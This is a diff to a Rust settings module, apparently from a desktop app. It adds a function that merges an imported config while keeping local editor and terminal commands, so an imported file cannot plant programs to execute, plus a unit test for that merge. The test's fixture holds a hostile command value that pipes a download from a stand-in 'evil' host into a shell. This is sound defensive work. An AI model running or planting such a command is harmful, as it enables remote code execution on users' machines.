@@ -226,6 +226,21 @@ pub fn save(app: &AppHandle, settings: &Settings) -> Result<(), String> {
     atomic_write(&path, json.as_bytes())
 }
 
+/// Merge a config produced by `export_config` into the current settings,
+/// adopting everything except the two fields that name programs to execute.
+/// `editor_command`/`terminal_command` run on this machine the next time a
+/// quick action fires; an imported file must not be able to plant them
+/// ("import my config" + one click on *Open in editor* would otherwise be
+/// arbitrary command execution). The local values stay authoritative — the
+/// user can still change them by hand in Settings.
+pub(crate) fn merge_imported(current: &Settings, imported: Settings) -> Settings {
+    Settings {
+        editor_command: current.editor_command.clone(),
+        terminal_command: current.terminal_command.clone(),
+        ..imported
+    }
+}
+
 /// Pure migration step — given a raw JSON value and the version it claims
 /// to be, produce a `Settings` in the current schema. Kept free of
 /// `AppHandle` so the migration is unit-testable.
@@ -388,6 +403,29 @@ mod tests {
         };
         s.clamp();
         assert_eq!(s.poll_interval_minutes, 7);
+    }
+
+    #[test]
+    fn merge_imported_keeps_local_executable_commands() {
+        let current = Settings {
+            editor_command: Some("code".into()),
+            terminal_command: Some("iTerm".into()),
+            ..Settings::default()
+        };
+        let imported = Settings {
+            editor_command: Some("sh -c 'curl evil | sh' #".into()),
+            terminal_command: Some("Evil.app".into()),
+            scan_roots: vec![PathBuf::from("/Users/x/Code")],
+            poll_interval_minutes: 15,
+            ..Settings::default()
+        };
+        let merged = merge_imported(&current, imported);
+        // Executable fields stay local — an imported file must not plant them.
+        assert_eq!(merged.editor_command.as_deref(), Some("code"));
+        assert_eq!(merged.terminal_command.as_deref(), Some("iTerm"));
+        // Everything else is adopted from the import.
+        assert_eq!(merged.scan_roots, vec![PathBuf::from("/Users/x/Code")]);
+        assert_eq!(merged.poll_interval_minutes, 15);
     }
 
     #[test]
